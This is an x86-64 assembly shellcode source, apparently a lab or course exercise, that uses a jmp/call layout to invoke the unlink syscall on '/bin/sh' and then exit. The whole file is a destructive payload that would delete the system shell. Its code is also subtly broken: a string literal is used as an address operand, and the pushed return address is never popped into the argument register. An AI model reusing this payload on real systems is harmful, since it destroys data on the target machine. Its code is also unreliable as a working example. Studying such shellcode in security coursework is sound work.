#include <sys/syscall.h>

#define STRING	"/bin/sh"
#define STRLEN	7
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+8)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	xorq %rax, %rax
	movb $SYS_unlink, %al
	leaq STRING($0), %rdi
	syscall

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING